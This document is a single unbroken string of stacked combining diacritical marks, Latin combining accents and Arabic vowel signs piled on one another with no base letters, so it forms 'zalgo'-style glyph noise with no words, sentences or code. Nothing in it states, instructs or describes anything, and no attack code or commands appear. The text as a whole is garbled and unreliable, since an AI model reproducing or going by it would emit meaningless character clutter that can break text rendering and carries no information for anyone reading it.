̵̶̷̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̡̢̡̛̩͕̗̣̳͍͎͕̺͍̗̭̟̠̬̯̱̙̦̀̆͌́̿͛̃̉͋͌͛̈́̌ͩ̀̈̈́ͮ̄̚͟͝͝͠ͅ͏̵ًًًٌٌٍٍٍَََُُُِِّّّ̢̛̠̱̲͓̫͍̱͈̂ͥ̉̿͑ͤ̎ͫ͗ͮ̚͜͟͠ͅ҉̷̶̴ًًٌٌٌٍٍٍََُُِِِّّ̛̝̙̘͕̲̤͙͓͍͇̄͒̀̇ͦͨͯ̌͗͟͟͝͞͝͞͡͠͏ًَّ̙͈ͯ́ͪ҉̸̷̸̴̷̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̨̡̨̧̧͉̠̫̫̰̪͔̺̻̯̩̠̼͎̗̩̝̰̱̺̘̞̒ͮͭ̀ͯͮͯͤ̃̽ͫ̆́̀̊̈́͑̂̚̚͜͟͜͟͞͡͏̸̵̶̶̵̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِّّّّّّّّ̡̡̨̛̛̫͍̯͖̘̫͓̮̬͎̣̲͉̲̼̺̮̥̘͙͈͈̙̣͇̻ͣ͛ͮ́͐ͧ̓̑̀ͦ̔́͗̆͋͑͑ͣ̇̏́ͩ͘̕̕͟͢͜͢͠͝͡͡ͅͅ͏̶ًًًٌٌٍٍََُُُِِّّ̜̳̝̣̼̮̲̻̺̼̒ͪͪͬ́̚͘̚̕̚͜͡͏̸̸ًًٌٌٌٍٍٍََُُِِِّّّ̡̡̛͈̺̗͓͈͕̓̉͋͆́́̀̉̒͊͜͞͏̶̴̷ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̧̛̠͖̩̩̝̼̫̤͍̫̜͇̫̫̯̹͇͙͉̼̺͚̟̅̈ͧ̇̉̃̋ͥ̋̀̄͛́̈̇ͫ̄͋̉̾̇̕̕͘͘͢͢͠͞͝͝͞͡͠ͅ͏̸̷ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̡̛̛̪͔̪̺̝̩̮͂ͨ̏͊̃̓͊͘̕͢͟͡͝͡͞͡͏̶ًٌٌٍٍَُُِِّ̢̦͍̭̜͒̂̍̎ͬ̆ͨ̃͞͡҉̷̶̴̶ًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّّ̡̡̡̧͍̹͕̫͙̱͈̖̱͉̣͚̄̌̏̀́ͦͪ̾̄̀̅͋̓̐ͮ̇͂͛ͫ̽͢͢͢͜͟͠͝͞͞ͅͅ҉̷̷ًًٌٍَُُِّ̭͙͈͈̮̟͋ͮͯ̕͜͞͏ٌٍِّ̦̞̏͟͏̴̷ًًٌٌٍٍَََُُِِّّ̡̧̯̖̹̮͚̳̣͛̀ͣ̓͗̀͋͏̵̷̶̴̶ًًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̡̨͖̘͇̗͕̟̩̫̺̭͔̙̬̼̦͓̰̌͋͊͛̅̔ͤͮ̀̐̑̆̍̎͐͛̉̔ͦ̓̒̕̕̚͢͠͝͡͏ًٍَِّ̢̜̻͔̤͊̂̃҉̴̵̶ًًٌٌٌٍٍََُُُِِّّ̯̮͕̖͉̫̠̭̿ͫ̂͘̕͡͠҉ًٌٍَُِِّ͓̯̙̖͕̀̅́ͩ̑͛͏̴ًٍَّ̮̩̄͛҉̶ًًًٌٌٌٍٍٍَََُُُُِِِّّّ̧̨̨̧̛̛̛̼̤̙̟̭͕̣̙ͧ͒̎̒̃̉ͬ̄͗͗̊̉̃͘͘͜͏ًٌٍَُِّ̢̠͈͔͚͕̗̐̀̽͌̉͆͟҉̶̴̸ًًًٌٌٌٍٍٍَََُُِِِّّّ̨̧̞̲͍̯͚̲̮͎̥̟̔̐ͫ̉̓͂̆́ͫ̕͘͢͢͡͏̸ًًٌٌٌٍٍٍََُُُِِِّّ̛̻̼̻̠̬͍̺̘͕̦̞ͤͯ͂̋ͯ̌̀̀̍̇̿͘̚͘͘̕͟͜͟͟͝͠͝҉̶̵ًًٌٍََُُِّّ̡̛͇̞̗̳͍̄ͤͩͤͮ͊̕͢͟͝ͅ҉̷̶ًًًًٌٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̡̢̨̨̙̠̞͙͎̖͈̲̥̪ͩͫͩͧ̀͗̐̆̀͋ͦ́̌̕͘͡͡͡ͅͅ҉̸̶̴ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̨̯̙͈̱̬̭̼͓̮̣̖̘̯̖̺̙͓̒ͩ̈̊̈͋͗ͨͭͧͭͦ̀̽̑̐̓͌͗̕͜͟͞͡͞҉ًًٌٌٍٍَُُِِّ̢͓̯̞̝̙͍̜̒͗ͨ̀ͨͨ̋͂ͨ͘̕ͅ͏ًًٌٌٍََُُِّّ̧̜̟̘̬̇͌̚͘̚͟͠͡͡҉ٍِ͎̌͏ًٌٍَُِّ̨̜̹̪̟̯͔̏҉ًٌَُّ̧͕̟̹́̋͜͏̸̶̸̷̸ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̢̡̡̨̢̢̨̛͕̥̦̭̗̬̥̠̳̬̭̠͔̳̮̠̦͓͔͎̟̬͉̜̝̀̆̌͌ͦ̆͂͑ͭ͐̎͑̄̾ͨͥ̽́̀͐̔̃͐̄̈̆̀ͯ̿̂̚̕͟͠͡͝͞͠͡͝͏̶̴ًٌٌٍَُِّ̘̙̩̗̔ͧͣ̽ͫ̅̕͝҉̴̵ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̢̧̡̛̳̘̺͉̤̙̮̙̣͙̲̫̺̬̺͉̘͆̈́ͫ͆̅̊̀ͧ̇͋͗ͭ͐͂ͩͧ̽ͮ͘̕͜͝͝͝ͅ͏̴̴̴̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̢̡̢̛̝̮̪̱̰̦̲̜̟̻̝̳̱̱̟̬͈͙̹͇̗̂ͨ́͗̃ͭ̀ͭ̒̍̎̾̾͂ͥ͒ͤ͆̄̕͜͜͠͝͞͠͏̵̸̸̷ًًًٌٌٌٍٍٍٍَََُُُِِِِّّّّ͔̯̯̻͖͔̼̫̹̣͔̈͆ͬ͋͌̓́̆́ͣ́ͧ͘͘̚͟͢͝͠͏ًًٌٌٍٍََُُِِّّ̢̺̫̥͖ͣ́́̐ͧ̿̉͊ͪ̕͜͢͞͠͏̶̶ًٌَُ͖̱͉̇́̊̔҉̶ًٌٍَُِِّ̧̛̠͉̖̞͛̉̊̂̓҉̷̴̵̴̴̷̵̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̧̢̛̺̪̻̫͙͎̩͇̺̗͇̹͓̞̦̟͓͍̤͙͚̪̳̠ͧ̓ͫ̊͐ͭͨͥͪ͋͌͆͌͑́͊ͭͬͮͥ̀̈͊̚̕͜͟͟͞͝͡͠͞͠ͅͅ҉̸ًٌٍَُِّ̘̽̂͢͟͝͏̷ًٌٍَُِّ̨͓ͥͩͫ̊͡͝͏ًًٌٍَُُِّ̧̛̫͎̬̥̂ͮ̅ͭ͟͞ͅ҉̸̶̸ًًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̨̨̳̺̦̝̝̟͙̯̲͚̖͔͉͔̒͌̾̐́̈́̀ͨ̿͆̀̂͊̓ͨ̏ͪ̑͋͘͘͢͜͠͡͞͞ͅ҉̶̵̶̸̵̸̸̶̷̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّ̧̧̧̧̡̨̢͕̖̺̜̥̼̲̳̜̖̖̩̙͇͚͙͚̥͕̘̱͓̘͓̹̖͉̳̲̝̩̘̠͉̠̟͒́ͫ̓͗̉̊̌́̂͒͂̌̓̎̓ͤͨ͋ͣ́͊͌͐͊̊ͭ̌̀̂̓̒ͧ͂ͥͭ̐͗́̌̕̕̕̕͘̕͢͟͜͟͢͜͢͢͠͞͝͠͞͠͝͞͝͠͞͝͝͏̶̷̶̸ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّّ̢̡̡̧̨̧̛͇̗̬̺͎̙͇̖̬̲̲͈̖͓͈̞̭̼̘̱̭͓͕̲̼͈͔͖̤̬̩̗̗̥͕̺͉̯̲̦͉͓̣̝́ͪ̑̀ͧͪ̀̉̅̑̈͊ͯͮ̋̄̀̑ͯ̀ͦ͑̂̎ͫ̆͂̄͛̿̅̋ͭ͛͑͛̇̇ͬ̆̆͘̕̚̕͘̕͘͘͢͢͜͢͢͡͠͡͠͠͡͠͠͝͠ͅͅͅ͏̶ٌٍُِ̺͖̱ͤͭ҉̴َّ͇̑͏̶̸ًًًٌٌٌٍٍٍََُُُِِِّّّ̨̧̛͉͇̙̟̝̼̰̺̺̝̝̾ͬͭ̔́ͮ̅̄͘͘̚͜͡҉̴̷̸ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̡̡̨̡̡̡̛̛̛̛͓͉̮͕̣̤̳̻̳̱̘͎͚̖̲̜̭͕̙̤̫̗̭̤̼̯̠̽̃̃͌͋̓͐͂̀͊ͮ̌̎͑̈͑̀̌̈ͯ̆ͦ̓̋ͤ̅̕̕̕̕͟͟͢͠͡͝͞͝͝ͅͅ͏̶ًَُ̎͏̵ًٌٍَُِّ̨̺̼̣ͤ̐ͪ͘͢͏ًٌٌٍَُِّ̢̡̟̳͚ͦ͐ͯͩ͜͡҉̷̵̴̴̸̵ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̡̢̢̣̜̗͈̦̼͔̩͔̼͎͉͂ͣͯ̇̄̋ͭ́̋͋̂͆̽͘̕͢҉ٌُِ̳̝̀҉̷̷̸̷̸ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّّ̧̧̧̢̛̛̛͈͚̻͇̲̺͉̪̖̫̝̙͎̲̺̪̤̣̮̥͌̀̈̋͐̅ͭ́͂̃̎̀͐̀̌͐ͬ͊ͥ̆ͤ̽ͩ̈ͤ̓ͩ̃ͪͦ̋ͤ̈̀͘̕͘͘͜͢͢͢͠͞͏̵̶̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̡̢̢̡̢̧̰͈͇͈̯̳̥͈͚̣ͣ̍̀̍̅͂́ͦ̅͆̀̇͛̏͜҉ٌٍَِّ͉͉͈̱̽͠͏ًٌٍَُِّ̢̭̬͈̙̣ͯ͐̅͟͠͡͏̷̵ًًًٌٌٌٍٍٍََُُُِِِّّّ̡̣̱̮̗͔͈̥̙̻̀̏̋͊̓̂̍ͨ̈͢͡͝͏̶̴ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّ̢̱͎͕̘̰̠̘͕̱̠͗̊͐ͤͥͧͪ̈́̉̄ͭ͋̎̕͡҉̴̷̶̴̴̶̶̸̶̶̶̷̸̷̶̶̵̶ًًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََََََََُُُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّّّ̨̧̨̨̧̢̡̨̧̛̛̛͖̰̲̜̫͕̻̞͎̫̠͈̳̼͓͖̩͉̯̲̺͇̺͓͉͕̻͍̫̯̥̪͕̯͙̻̠̩͇͔̗̲̯̘̭̙͚̲͉̫͇̣̳̬̱̞͍͓̦̤̲̠͎̞̱͔̳̲̯̺̃ͫ̉̓ͥ̽́̈ͧ̾ͪͯͮ͗̍̔̀ͦͭ̐̏̀̇̂̃́͑̑̈͋̉ͫͥ̀̑ͣ̇́͂̀ͯͤ̅͌ͧ͋͛ͤ͂͂̒̂͑ͩ͌͂̎͐̄̓́ͮ͛̎̋̀̈́̏ͦ̇̃̓ͪͣ͆̋̍̃ͥ̈̈́̕̚̕͘̕̕͘̕͢͜͢͢͜͜͜͢͟͜͟͠͡͝͡͡͡͞͞͠͝͝͝͡͞͏ًٍَّ͓̣̆͟͏̷̶̵̶̶̵̷̷̵̵ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِِّّّّّّّ̧̢̡̛̭̤͈͇̫͍̦̖̳̲͔̯̞̦̮̯͔̥͕̰̱̹͈̞̤̘̘̼͚͓ͪ̒̇̋ͮ̏͌ͩͩͫ͑͂͋̊ͨͫͬ̄ͪ̐͂̄ͥ̈͘͢͢͢͡͡͝͡͝͝͞͞͝͞͝͏̷ًٌٍٍََُِّّ͚͚̤̝͎͐̀̍͐̆̿͡҉̶ًٌُِ̰͖̾̉҉̶ًٍَّ̪̰̀ͮ̒͏̶̴̴̷ًٌٌٍٍَُُِِّ̛͔̹̾̿̑͞͡͠͏̶ًٌَُِّ͇̠̪͗̀́҉ٍَّ̖ͪ͝͏̵̵̶̷̵̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّّ̧̨̨̡̛̛͈̬̦̳̻̯͍̲̦̜͈̯̫͓̬̳͎̟̓́̇͐ͫ̍̌̏ͫ̓̎̿̈́ͬ̈́ͮͬ̊̄͊̉́̊̅̌̓͟͜͡͝҉َ҉̸̴̶ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّ̧̢̰͙͙͍̻̟̫̯̭̤̼̫ͭ̉͗̃͛͆̀̌ͬ̒͂̑̅͂͂̀͌̃͘̚͢͝͏̶̵̷ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̨̧̟̖̙͇̘͎̹͕͈̠͓̺̫̘̿͛͂̎̀ͦͮ́͂͒̀ͯ̓̈ͬ́͑̓̽ͨ̃ͦ̕͜͟͟͜͡͠͠͞҉̴̸̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̨̡̧̛̯̲̱̘̟͖̳̗̟̗̖͒̊͒͂͂ͪ̄̌̎̋͗̄́̍ͯ̕͜͡͠͝͠҉ًٌٍَُِِّ͍̳̗̥͗̽͑̅͘͠͏̵̶̷ًًٌٌٍٍََُُِّّ̧̢̯̩̰͍͇̞͕͖̫͗̎͐ͨͨ̆̄͘͝҉̴̷̴ًًٌٌٍٍٍََُُِِِّّ̡̹̗͓̱̗ͫ̓ͨ̑ͤ̿̆̐͢͢͠͞͝҉̸̶ًًٌٌٍٍََُُِِّّّ͈̩̩̯̝̭̬̳͚̺͔ͯ̾͋͂̿́̽̃ͬ̈̇͟͟҉ًًٌٌٍٍَََُُِِّّ̧̡̛͙̞̟̳̹̳̖̖̔̊́ͭ͋͒̊̓ͤ̀̚͘͜͢͝͏̴̴ًًٌٍَُُِّ̞̹̰͇͕̱̓ͮ̊͊̆ͦ͢͝͡͏̶̷̶̶̵̶̷ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̨̡̧̩̞̮͉̦͖̻͇͉͚̦̹̼̹͓͙̯̽͑̋ͥͯ́ͧͯͣ͒̍̍ͤ̊ͪ̆̕̕͘͟͜͠͡͡͏ًٌٌٍَُِِّ̥̼̪̩̖̩̌̀̂̑ͫ͒͢͜͡͏̸̵̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̡̛̛̛̻̗̮͚͚̱̘̳̝͈̙̳͙͇̰̮͙̲͍̝̥̐̂́̈́́ͭ͐͌ͦ̈́̊́ͭ̏́͌͂̑ͣ̏̔̅̔̅ͪͪ̈̕̚͟͟͟͝͠͏ًُ̝͖͛͏ًًٌٌٍٍََُِِّّ̢̧̢̡̫̣̜̠͙̦͆̎͆̕͝҉̷ًٌٍَُِّ̡̢͖̙̳̿͗ͤͭͧ͏̸ًًٌٌٌٍٍََُُُِِّّ̨̧̫̳̟͉̠̭͙̗͕̑͆̈́̊́́͑́́ͮ̚͢͡͠҉̸ًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̧̨̛̛̣͓̝͓̩̭̱̝̰̗̗̥̰̱̖̥̝ͧ̽͌ͤ͂̂ͧ̿̆͋ͨͬ̂̅̎͐̀̿̀ͯͣ͘̚͜͢͜͟͜͠͠͝͞͡͏ًُ̜̒̕҉ٌ̮͏̸ًًًٌٌٌٍٍٍَََُُُِِِِّّّ̡̧̬̥̞͖͕͈̖̮͎͖͖ͭ͌̀̾̐̽ͨͣ̓͡͞͝҉ًٌٍٍَُِّ̡͎̯ͨͨ̿͆́̅̍͞͏̴ًٌٍَُِّ̞͙̻̠ͧ͂͐͏̸̸ًًٌٌٍٍََُُِِّّّ̨̥̙̜͚͇̭͖͕͚̀ͣ͌ͤ̿̓̉̔͜͟͢͝ͅ͏̷̴̸̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̛̱̰̜̯̱̖̩̙̩͖̟̮̤̏͐̂̉͗͂͑̋͘͜͡͞͏̴̷̵ًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّ̧̨̛̲̞͓̮̹̙̖͖͉̣̫̙̲̣̞̖ͭ̏͐̎ͫ́͒̎͂ͨ́́̑́̒̕͘̕͢͠͞͝ͅ҉̸̸̸̵ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̢̛̛͎̬̝̻̰͙̹̪̩̯̦̗̘̳̱͔͖͕̖̬̲̩̹̜̙̝̖͋̏̌͗͆ͦ̓́̍̎ͯ͌́̍̌ͫ̓̈́̒ͥ͋̈́̍̄̎̎̎̀̓̕͢͟͜͜͟͞͞͞͞͠ͅ҉̴̴̷̶ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّ̨̢̧̭͈̤̰͕̳͙͕̺͓̞͙͓̀ͪ̽́̂̃͂͂̇́̈ͬͬ̉́̔̈́͘͜͢͞͡ͅͅ͏ّ̅҉̷̶ًًٌٍََُِّ̟̣̝̫̀́̂͡͠͝͠ͅͅ͏̷̴̴ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̨̢̨̛̞͈͓͕̗̮͚͎̩̹̘̫͔̣͍̮͇͓̤͙͎̒̑̐̅̎ͤ́̂́̈̈ͯ̀ͣ͑̇̈̽͜͢͠͏ًٌٍََُِّّ̢̢̢̤͇̱͕̍͂̈́̐ͮ͑ͬͦ͝͏̴̷̷̶̴̷̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̢̡̨̨̛̱͚̝̝͖̳͚͚͙̝̪̖͇̭͙͈͍͆̓̍̇̿ͮͦͣ̎̀́̀͑̒̎̀̎͒̽̒̕̕̕͘͘͜͜͠͞ͅ͏̵ًٌٍَُِّ̢͓̖ͩ͒͡͏̶̸̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍََََََُُُُُُِِِِِّّّّّّ̢̧̢̭̤̫̙̖̲̜̟̫͍͔͍͖͓̜̻̼͈͕̭̳̣̭̤̉̅͗̃ͣ͐́̈͛̐̀͂ͫ̋ͯͬ̂͂̇͊̆͢͜͡͠҉̵ًًٌٌٍٍٍََُُِِِّّ̡̨̙͉̣̮̰̝̀̓́̌͑ͪ̈́̋̕͢͟͟͝҉̸̴̷̸̶ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̡̨̨̯̘̱͎͉̘̝͎̻̩̮̝͇̥̙̥̭̽̅̀͌̀̈͗ͩͯ͗͒͒̓́͗͌͑̿́̓͋̕͢͟͢͝͡͏ًٌٌٍَُِِّ̧̢̛͖̱͕́̋͋͐̍̋ͮ́ͤ̚͘͞͏̶̷̴ًًًٌٌٍٍٍَََُُُِِّّّ̡̛̱͕̭͎̲̋̑̃͑̍͛ͭ̓ͧ̇̿̀̃͠͝ͅ͏ٌٍِّ̡͉̀ͩ̿҉̶̴ًًٌٌٍٍََُُِِّ̨̨̡̘̯̠̖̳̠̦͇̠̺͗̈͐͗͢҉̸̸ًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّّ̨̡̨̢̢̛̠͔͖̩̞̖̖͉̳̠͚̪̙̬̜͎̻̣̼̾̑̎́́ͭ̊̇͒̋̐ͭͬͪ̋̓̕͢͜͜͢͝͡͠͞͠҉̸ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّّ̢̡̧̢̧̬͚̩̙̘̝̗̬͈̹̠̤̥̰͇̰̭ͥ͑̓́ͩ̄ͧ̔̊́̐̀̃̌̾͂̒̿͘͘͘͟͟͟͟҉ًَ͉́̕҉̷̸ًًٌٌٌٍٍٍََُُُِِِّّ̨̦̩̮̪̗͖̝͓͆̀̀ͬ͋̐̀́̚͘͟͠͡͠͏̸̶̸ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̨̨̡̛̦̻͈͇̟̼̫̩͈̳͍̰͙̜̭̓̑̊̏̽͌͑͑̎̅̀̆͋̓̿̍͐̈ͣͬ̋͟͜͡͠͡҉̴̷̶ًًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̢̣͖̞̙̹͙̗̯͍̙̖̭̭̟ͩ̓ͮͭ͒̃͋ͦ̔ͣͩ̅͂͘̚͟͟͢͟͡͏ًًٌٌٌٍٍٍََُُُِِِّّ̢̩̪͚͔͓͖̟͉́̐ͧ̀ͭͭͭ̔̀ͭ̿͘͢͏̷̷̶̸̸̶̵ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّّ̡̧̡̡̧̨̛̛̛̺̦̯̯̼̰̗̳͇̞͇̼̠͍̫͙̦̤͍̗̰̱͉̱̞̟͎̼͕̰͕̱̩̤͍̖͈̃ͮ̎̉́̉͐̐͗͂̑̏̾̔͗̊́ͦ̃̀̊ͯͥ̉́̆ͦͬ͋̀̀̉ͥ́ͫ̅̓̾̉̌̎̓̀͒͂͗͋̚͘͢͠͠͞͝͝͞͠ͅͅ҉̷ًٌٌٍٍَُِِّ͚̮̩̻̏̎̒ͧ͞͝͏ًَُّ̻͇̩́͗҉̴̴̷̸ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̧̨̛̰̺̫͇͚̬̳͖̭͖̱͚̫̪̯̫̺̗̘ͣ̔ͦ͌͑̈́̐̈̍ͯ̐̄͆̍̉͘̕͘̕͜͟͢͢͝͝͞͠͡͏̴̶ًًٌٌٍٍٍََُُِِّّّ̩̝̻̱̹̣̣̙̱͈ͪ͑̐͊̍́ͮ͋̇ͫ͘̕̕̕͠҉̴̷̴̴̵̷̶̴̷̴̷̷̶̸ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّ̡̡̢̧̧̨̧̨̢̢̡̨̛̣̹̗̼̳͕͕̦̯̗̙͚̗͍̼͕͕̻̺͔͓̳̘̪͙̳͖̮̝̝͖̳͕̻̮͚̞͎̅̅̂͑̽ͧͥ̆̉ͧ̀ͪ̀̾͐̏̄͑ͨͦ̌̔͋̾͂ͧͣ͋́̀͐̔́͆͒̀̓̿ͨ́̉ͭ̎̀̓̒͟͜͢͢͟͜͜͟͜͠͠͡͝͠ͅͅ҉̵ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّّ̨̡̛̲̣̟̠̹̦̬̯̲̼̖̽̉͂́̓̄̎͊̃̒͌ͦͥ̌͘̕͢͝͡͠͠҉̸̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̧̧̦̺̳̘̥̘̥̜̖̲͒͆ͫ̍̅̓̇̋̐̓͋̍̓̄ͦ͘͟͟͝͡͞͝҉̴ًًٌٌٍٍََُُِِِّّ̢̛͚̹͍̙̳͈̩̍͋̽ͭ̀̇͘͢͞͏̵̴ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِّّّّّّ̨̨̢̨̛͎͍̝̬̮͍̠̣̫̙̟͉͈͚̫̱͓͉̠͚͙̤̙̂̒̏ͣ̐͊ͫͨ̅̊͌̀̈̀̓̃́̀ͪ̉̅͘̕͘͜͜͝͞͞ͅ͏ًٌٍَُِ̗̫͋̊̉͡҉̶̵ًًٌٌٍٍَََُُِِّّّ̧̛̺̬̘̲͈̖̤̦͒͒́ͩͪ̌̇͊͘͠҉̶ًُ̑̓҉̶̸ًٌٍَُِّ̪̲͖͇͊͋͛̃ͦ̀͡͞͏ٌ̎͏ًٌٍٍَُِِّّ̻̪̫̠̜̭̿͌̀ͩ͐̀̚͟͜͏ًٌَُ̨̨̻̤͆̽͆͏̷ًًٌٌٍٍََُُِِّّ̡̝̺̝͋ͮͮ̍͛̀̿̋͘͠͝҉ٍِ̘҉̷َّ̞̯ͫ҉ًٌُِ̖͔̘̂ͫͫ̕͏̴ًًًٌٌٍٍٍَََُُِِّّّ̛̛̛̱͔̟͉̩̦͉̯͉̼̍̈́ͮ̀ͧͦͦ́͌̕̕͜͟͝͝͏̴̸̵̴ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̧̘͓͉͎͉̲̝̝͈̙̤̜̱̆ͮͨͬ͋̔͐̅̀̎̈ͮ̿ͧ̌̃̕̕̚̕͢͟͟͟҉̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̨̛̛͕̺̣̼̮̖̙̥̗̪̦͚̣̊͊́ͧ͊ͥ̒͋́́͛͢͜͢͢͞҉̶̷ًٍَُِّ̨͚̩̽͌̽͏̴̷ًٌٌٍَُِّ̤͖̳͂ͯ͐̀̿̆̕͏̷̴ًًًٌٌٍٍٍَََُُُِِِّّّ̧̬̖̠̬̱̖̲͎̬̮̖̭͙̏̆̅ͩ̈̏̍ͣ̀ͯ̔͟͟͟͞͠ͅ͏̶̸̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̨̢̡̧̛̻͈̯͕͙̫̯͚̦̤̘̭͔͓̲̣̪͉̘̣̺̀͂ͮͤ̋̃ͣ̄̃͒̓͗ͦͨ̌̌̊̕̚̚͢͡͡͞҉̷̶ًًٌٌٍََُُِّّ̰͇̖̹̪͈ͧ̑̆̽͌͊ͦ͟͞͝͝͏̵̴̵̴̸̷̶̴ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̨̨̧̧̨̢̡̟̰̳̖̝̲̬̹͕͓̮͉̠̞̙̰̙̥̣̯̩̣͚͎̭̫̪͖̘ͭ̔̆ͯ̀̆̐̈̒́̐ͭ͑͐ͫ̈́͊̂ͧ̓̽͒͑̍̽ͤ̎̿̈̒͋̌͘͘̚͘̕̕͜͟͟͢͞͡͞͠͏̸̸̷̸ًًٌٍٍََُُِّّ̨͙̩̮̩̪͙͛ͣ̆̿́̿͝͏̷̸̷̴̸ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̢̨̢̫͙̳̫̬̭͉̰͈̱̮̭̖̦̒̈́ͭ̊ͬͬ̍̏̀ͯͦ̃̇̎́͌ͭͤ͘͘̕͜͢͡͝͠͝͞͡͝ͅ҉̵̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّّ̡̨̛̜͓̥͇͈̦͉̤̜̘̹̯͈̫̄͑̽͊ͯ̅ͣ͆͂́ͮ̔̆̀͊̕͘̕͘̕͢͟͟͠͡ͅͅ͏ًًٌٌٍٍَََُُِِّّ̼̩̼͚̦̤͖̖̘̔̀̑̿͆̀̐̂̀ͥͨͨ͑̀̊̕͢͜͜͡͏ًٌٍَُِّ̨̨͈͚͔̀ͩ͑ͪ̈́́̉̚҉ًًٌٌٍَُُِّ̨̨̨͙̜̣̯̦̩̬̽́ͫ̊ͬ͘͞͠҉̵ًًٌٌٍٍٍََُُِِِّّ̞͎̬̞̻͎͓͔̟́̈͋ͬͬͨͩ̒̚͢͟͟͝ͅ҉̶ًَّ̯͂̈͏ٌٍَُِّ̛͔͠҉̸ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̛̝̥͔͚̙̜͚̹̫̺̯̪̹̝̦͋ͤͪ̀̍͆̉͑̀̋͒̎ͦ͛͘͝͠ͅ҉ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̨̨̢̛̲͙͙̤̳̻͈̯̱̼͈̳̟̙͈̺͓͓͙̬͕̻ͧ͊̍̓ͯ͒̓ͮͤͦ͋̏̂́͐̂̎̀ͥ͛̇̌̚͢͜͞͡͡͝͡͝҉ًًٌٌٍََُُِّّ͉͈̙͍͇͖̹͇́ͨͨͨͤͩ̍̌͞҉̶ٍَِّ͉̤̲͓̋̇͏̴̴ًٌُِ̧͖҉ٍّ͇̔